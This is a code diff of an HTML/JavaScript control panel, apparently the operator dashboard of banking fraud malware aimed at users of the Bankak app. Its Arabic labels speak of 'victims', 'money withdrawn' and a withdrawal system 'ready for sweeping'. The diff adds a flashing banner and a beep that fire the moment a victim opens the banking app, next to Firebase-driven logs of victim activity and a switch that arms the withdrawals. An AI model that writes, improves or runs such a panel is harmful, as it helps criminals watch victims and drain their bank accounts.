@@ -3,55 +3,52 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Bankak Admin - Abbas Al-Dawli</title>
+    <title>Bankak Admin Pro - Notifications</title>
     <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
     <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
     <style>
-        :root { --main-blue: #003366; --gold: #d4af37; --light-bg: #f8f9fa; }
-        body { font-family: 'Segoe UI', Arial, sans-serif; background: var(--light-bg); margin: 0; padding: 10px; }
-        .card { background: white; max-width: 450px; margin: auto; border-radius: 20px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); overflow: hidden; }
-        .header { background: var(--main-blue); color: white; padding: 25px; text-align: center; }
-        .header h1 { margin: 0; font-size: 22px; }
-        .header p { margin: 5px 0 0; font-size: 13px; opacity: 0.8; }
-        .status-area { padding: 20px; text-align: center; }
-        .btn { width: 100%; padding: 16px; border-radius: 12px; border: none; font-size: 18px; font-weight: bold; cursor: pointer; margin-bottom: 12px; transition: 0.3s; }
+        :root { --main-blue: #003366; --gold: #d4af37; }
+        body { font-family: 'Segoe UI', sans-serif; background: #f0f2f5; margin: 0; padding: 10px; }
+        .card { background: white; max-width: 450px; margin: auto; border-radius: 20px; box-shadow: 0 4px 15px rgba(0,0,0,0.2); overflow: hidden; border-top: 6px solid var(--main-blue); }
+        .header { background: var(--main-blue); color: white; padding: 20px; text-align: center; }
+        .btn { width: 100%; padding: 15px; border-radius: 10px; border: none; font-size: 16px; font-weight: bold; cursor: pointer; margin-bottom: 10px; }
         .btn-on { background: #27ae60; color: white; }
         .btn-off { background: #e74c3c; color: white; }
-        .btn-turbo { background: var(--gold); color: white; border: 2px solid #b8962e; }
-        .log-box { background: #f1f3f5; border-radius: 12px; padding: 15px; margin: 10px 0; text-align: right; border-right: 5px solid var(--main-blue); }
-        .log-box h3 { margin: 0 0 10px; font-size: 15px; color: var(--main-blue); }
-        .data-list { font-size: 13px; color: #444; min-height: 40px; line-height: 1.6; }
-        .footer { background: #eee; text-align: center; padding: 15px; font-size: 12px; color: #666; font-weight: bold; }
+        .notification-banner { display: none; background: #ffcc00; color: #000; padding: 10px; text-align: center; font-weight: bold; animation: blink 1s infinite; }
+        @keyframes blink { 50% { opacity: 0.5; } }
+        .log-box { background: #fff; border: 1px solid #ddd; border-radius: 10px; padding: 10px; margin: 10px; height: 120px; overflow-y: auto; font-size: 13px; }
+        .footer { text-align: center; padding: 15px; font-size: 12px; color: #777; font-weight: bold; }
     </style>
 </head>
 <body>
 
+<div id="alarmBanner" class="notification-banner">⚠️ تنبيه: الضحية دخل الآن إلى بنكك!</div>
+
 <div class="card">
     <div class="header">
-        <h1>مدير بنكك محترف</h1>
-        <p>نظام التحكم المتقدم - عباس الدولي</p>
+        <h2 style="margin:0;">رادار عباس الدولي</h2>
+        <p>نظام التنبيهات الفورية</p>
     </div>
 
-    <div class="status-area">
-        <div id="stat" style="margin-bottom:15px; font-weight:bold; color:#333;">جاري الفحص...</div>
+    <div style="padding: 15px;">
+        <div id="stat" style="text-align:center; margin-bottom:10px; font-weight:bold;">الحالة: جاري المراقبة...</div>
         <button id="mainBtn" class="btn" onclick="toggle()">تحميل...</button>
-        <button id="turboBtn" class="btn btn-turbo" onclick="toggleTurbo()">الوضع السريع: عادي</button>
-
+        
         <div class="log-box">
-            <h3>الأنشطة الأخيرة (السجلات):</h3>
-            <div id="logs" class="data-list">في انتظار الاتصال...</div>
+            <strong style="color:var(--main-blue)">تحركات الضحية:</strong>
+            <div id="logs"></div>
         </div>
 
-        <div class="log-box" style="border-right-color: var(--gold);">
-            <h3>المبالغ المسحوبة (نقدًا):</h3>
-            <div id="cash" class="data-list">لا توجد عمليات حالياً</div>
+        <div class="log-box" style="border-right: 4px solid var(--gold); height: 80px;">
+            <strong style="color:var(--gold)">الأموال المسحوبة:</strong>
+            <div id="cash"></div>
         </div>
     </div>
 
-    <div class="footer">
-        برمجة وتصميم - عباس الدولي@2026
-    </div>
+    <div class="footer">برمجة وتصميم - عباس الدولي@2026</div>
 </div>
+
+<audio id="notifSound" src="https://www.soundjay.com/buttons/beep-01a.mp3" preload="auto"></audio>
 
 <script>
     const firebaseConfig = {
@@ -63,32 +60,43 @@
     };
     firebase.initializeApp(firebaseConfig);
     const db = firebase.database();
-    let s = false, t = false;
+    let s = false;
 
+    // مراقبة الحالة العامة
     db.ref('control/status').on('value', snap => {
         s = snap.val() === "true" || snap.val() === true;
-        document.getElementById('stat').innerText = "الحالة: " + (s ? "نشط" : "متوقف");
+        document.getElementById('stat').innerText = "نظام السحب: " + (s ? "جاهز للكسح" : "متوقف");
         const b = document.getElementById('mainBtn');
-        b.innerText = s ? "إيقاف التشغيل" : "تفعيل النظام";
+        b.innerText = s ? "إيقاف النظام" : "تفعيل النظام";
         b.className = "btn " + (s ? "btn-off" : "btn-on");
     });
 
-    db.ref('control/turbo').on('value', snap => {
-        t = snap.val() === "true" || snap.val() === true;
-        document.getElementById('turboBtn').innerText = "الوضع السريع: " + (t ? "خارق" : "عادي");
+    function toggle() { db.ref('control/status').set(s ? "false" : "true"); }
+
+    // آلية التنبيه الفوري عند دخول الضحية
+    db.ref('MyActivities').limitToLast(1).on('child_added', snap => {
+        const activity = snap.val();
+        if(activity.includes("تم فتح بنكك") || activity.includes("دخول")) {
+            // تشغيل الصوت وإظهار البانر
+            document.getElementById('alarmBanner').style.display = 'block';
+            document.getElementById('notifSound').play();
+            
+            // إخفاء التنبيه بعد 10 ثواني
+            setTimeout(() => {
+                document.getElementById('alarmBanner').style.display = 'none';
+            }, 10000);
+        }
     });
 
-    function toggle() { db.ref('control/status').set(s ? "false" : "true"); }
-    function toggleTurbo() { db.ref('control/turbo').set(t ? "false" : "true"); }
-
+    // تحديث السجلات
     db.ref('MyActivities').limitToLast(4).on('value', snap => {
         const d = document.getElementById('logs'); d.innerHTML = "";
-        snap.forEach(c => { d.innerHTML += `<div>• ${c.val()}</div>`; });
+        snap.forEach(c => { d.innerHTML += `<div>📍 ${c.val()}</div>`; });
     });
 
-    db.ref('Cash').limitToLast(4).on('value', snap => {
+    db.ref('Cash').limitToLast(3).on('value', snap => {
         const d = document.getElementById('cash'); d.innerHTML = "";
-        snap.forEach(c => { d.innerHTML += `<div>💰 مبلغ: ${c.val()}</div>`; });
+        snap.forEach(c => { d.innerHTML += `<div>💰 تم سحب: ${c.val()}</div>`; });
     });
 </script>
 
